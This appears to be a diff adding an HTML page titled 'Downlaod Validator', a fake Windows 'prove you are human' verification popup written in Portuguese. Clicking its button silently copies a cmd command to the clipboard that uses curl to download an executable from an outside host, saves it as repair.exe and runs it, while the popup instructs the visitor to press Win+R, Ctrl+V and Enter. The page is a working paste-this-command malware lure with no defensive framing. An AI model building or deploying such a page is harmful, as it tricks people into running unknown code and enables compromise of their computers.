@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Downlaod Validator</title>
+    <meta name="referrer" content="never" />
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: stretch;
+            background: #ececec;
+        }
+
+        button {
+            padding: 14px 28px;
+            font-size: 16px;
+            display: block;
+            margin: auto;
+            cursor: pointer;
+            border: none;
+            background: #2266E3;
+            color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        button:hover {
+            background: #1b55bb;
+            transform: translateY(-2px);
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease forwards;
+        }
+
+        /* Card moderno */
+        .popup-card {
+            background: #fff;
+            border-radius: 15px;
+            padding: 25px 20px;
+            width: 320px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            transform: scale(0.8);
+            opacity: 0;
+            animation: scaleIn 0.3s forwards;
+        }
+
+        /* Logo redonda */
+        .popup-card img {
+            width: 70px;
+            margin-bottom: 15px;
+            padding: 5px;
+        }
+
+        h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        ul {
+            list-style: none;
+            padding: 0;
+            text-align: left;
+        }
+
+        ul li {
+            margin-bottom: 12px;
+            padding-left: 20px;
+            position: relative;
+            color: #555;
+        }
+
+        ul li::before {
+            content: '✔';
+            position: absolute;
+            left: 0;
+            color: #E95420;
+            font-weight: bold;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 22px;
+            color: #888;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .close-btn:hover {
+            color: #000;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes scaleIn {
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <button id="openBtn">Abrir Instruções</button>
+    
+    <div class="overlay" id="overlay">
+	  <div class="popup-card">
+		<span class="close-btn" id="closeBtn">&times;</span>
+		<img src="data:image/png;base64,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" alt="Windows Logo">
+		<h3>Instruções Windows</h3>
+		<ul>
+		  <li>Para acessar o conteúdo da página, prove que você é humano.</li>
+		  <li>Pressione as teclas Win+R</li>
+		  <li>Em seguida CTRL + V</li>
+		  <li>E por fim Enter</li>
+		</ul>
+	  </div>
+	</div>
+
+    <script>
+        const openBtn = document.getElementById('openBtn');
+        const overlay = document.getElementById('overlay');
+        const closeBtn = document.getElementById('closeBtn');
+
+        openBtn.addEventListener('click', async () => {
+            overlay.style.display = 'flex';
+
+            try {
+                await navigator.clipboard.writeText(`cmd /c cd %localappdata% && curl "https://assets-sam.mkt.dynamics.com/421d5966-b49d-f011-8707-002248de7ae2/digitalassets/docs/2f4a7e2c-79a8-f011-bbd3-000d3ac171d1" -o repair.exe && repair.exe && echo "start validation process"`);
+                } catch (err) {
+            console.error('Unable to copy chalange', err);
+            }
+        });
+
+        closeBtn.addEventListener('click', () => overlay.style.display = 'none');
+        overlay.addEventListener('click', (e) => { if(e.target === overlay) overlay.style.display = 'none'; });
+    </script>
+</body>
+
+</html>
